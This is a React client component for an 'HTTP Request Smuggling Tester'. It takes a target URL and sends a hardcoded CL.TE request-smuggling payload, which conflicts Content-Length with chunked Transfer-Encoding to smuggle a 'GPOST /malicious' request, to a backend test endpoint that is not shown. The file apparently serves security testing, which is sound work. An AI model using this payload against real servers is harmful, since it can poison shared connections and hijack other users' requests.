"use client";

import React, { useState } from "react";
import { motion } from "framer-motion";

const HttpRequestSmugglingTester = () => {
  const [url, setUrl] = useState("");
  const [testUrl, setTestUrl] = useState<string | null>(null);
  const [isTesting, setIsTesting] = useState(false);
  const [history, setHistory] = useState<string[]>([]);
  const [response, setResponse] = useState<string | null>(null);

  const formatUrl = (input: string) => {
    if (!input.startsWith("http://") && !input.startsWith("https://")) {
      return `https://${input}`;
    }
    return input;
  };

  const testHttpSmuggling = async () => {
    if (!url) return;

    const formattedUrl = formatUrl(url);
    setIsTesting(true);
    setHistory((prev) => [...prev, `➜ Testing HTTP Request Smuggling on ${formattedUrl}...`]);
    setTestUrl(formattedUrl);

    try {
      const payload = "POST / HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nGPOST /malicious HTTP/1.1\r\nHost: victim.com\r\n\r\n0\r\n\r\n";
      const res = await fetch("/api/smuggling-test", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
        },
        body: JSON.stringify({ url: formattedUrl, payload }),
      });
      const result = await res.text();
      setResponse(result);
    } catch (error) {
      setResponse("Error: Could not connect to the server.");
    }

    setTimeout(() => setIsTesting(false), 3000);
  };

  return (
    <div className="max-w-5xl mx-auto p-6 h-full flex flex-col items-center justify-center">
      {/* Terminal UI */}
      <div className="bg-[#181a1b] w-full rounded-xl overflow-hidden shadow-xl border border-[#2d2f31]">
        <div className="bg-[#2d2f31] px-4 py-2 flex items-center gap-2">
          <div className="flex-1 text-center text-[13px] text-[#9da5b4] font-medium">
            HTTP Request Smuggling Tester
          </div>
        </div>
        <div className="p-4 font-mono text-[14px] bg-[#181a1b] max-h-[40vh] overflow-y-auto hide-scrollbar">
          {history.map((cmd, idx) => (
            <motion.div
              key={idx}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: idx * 0.1 }}
              className="text-[#98c379] mb-2"
            >
              {cmd}
            </motion.div>
          ))}
          {!isTesting && (
            <div className="flex items-center text-[#98c379]">
              <span className="mr-2">➜</span>
              <input
                type="text"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && testHttpSmuggling()}
                placeholder="Enter target URL"
                className="flex-1 bg-transparent border-none outline-none text-[#98c379] placeholder-[#4b5263]"
              />
            </div>
          )}
        </div>
      </div>

      {/* Response Viewer */}
      {response && (
        <div className="bg-[#181a1b] w-full mt-6 p-6 rounded-lg shadow-md border border-[#2d2f31] text-[#98c379]">
          <h3 className="text-lg font-bold mb-3">HTTP Smuggling Test Result</h3>
          <p className="text-[#9da5b4] mb-3">Response from the server:</p>
          <pre className="border border-[#2d2f31] p-4 overflow-auto text-[#c9d1d9]">
            {response}
          </pre>
        </div>
      )}
    </div>
  );
};

export default HttpRequestSmugglingTester;
